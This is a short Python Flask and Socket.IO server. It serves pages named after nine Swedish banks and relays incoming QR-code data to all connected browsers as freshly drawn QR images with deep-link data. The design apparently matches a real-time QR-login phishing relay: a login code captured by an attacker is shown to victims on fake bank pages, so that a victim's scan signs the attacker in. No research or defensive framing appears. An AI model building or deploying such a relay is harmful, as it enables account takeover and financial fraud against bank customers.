from flask import Flask, render_template
from flask_socketio import SocketIO
import qrcode
import base64
from io import BytesIO

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins='*')


@app.route('/')
def index():
    return render_template("index.html")


@app.route('/danske.html')
def danske():
    return render_template('danske.html')


@app.route('/handelsbanken.html')
def handelsbanken():
    return render_template('handelsbanken.html')


@app.route('/ica.html')
def ica():
    return render_template('ica.html')


@app.route('/lansforsakringar.html')
def lansforsakringar():
    return render_template('lansforsakringar.html')


@app.route('/nordea.html')
def nordea():
    return render_template('nordea.html')


@app.route('/seb.html')
def seb():
    return render_template('seb.html')


@app.route('/skandiabanken.html')
def skandiabanken():
    return render_template('skandiabanken.html')


@app.route('/sparbanken.html')
def sparbanken():
    return render_template('sparbanken.html')


@app.route('/swedbank.html')
def swedbank():
    return render_template('swedbank.html')


@socketio.on('qr_code_scanned')
def handle_qr_code(data):
    qr_data = data['data']
    print(f"[Debug] QR code received: {qr_data}")   
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,  
        box_size=10,
        border=4,
    )

    qr.add_data(qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")

    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')

    # Also send the QR data to the client for deep linking
    socketio.emit("update_qr_code_image", {'qr_image': img_base64, 'qrData': qr_data})


@socketio.on('request_qr_data')
def handle_request_qr_data():
    # This could retrieve stored QR data from a session or database if needed
    # Here we're just acknowledging the request
    socketio.emit('qr_data', {'status': 'waiting_for_scan'})

@socketio.on('request_fresh_qr_data')
def handle_fresh_qr_data_request():
    # This should trigger a new QR scan if needed
    # Or return the most recently scanned data
    if 'last_qr_data' in globals():
        socketio.emit('qr_data', {'qrData': globals()['last_qr_data']})
    else:
        socketio.emit('qr_data', {'qrData': ''})
        
if __name__ == "__main__":
    # socketio.run(app, host='0.0.0.0', port=5000, debug=True)  
    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)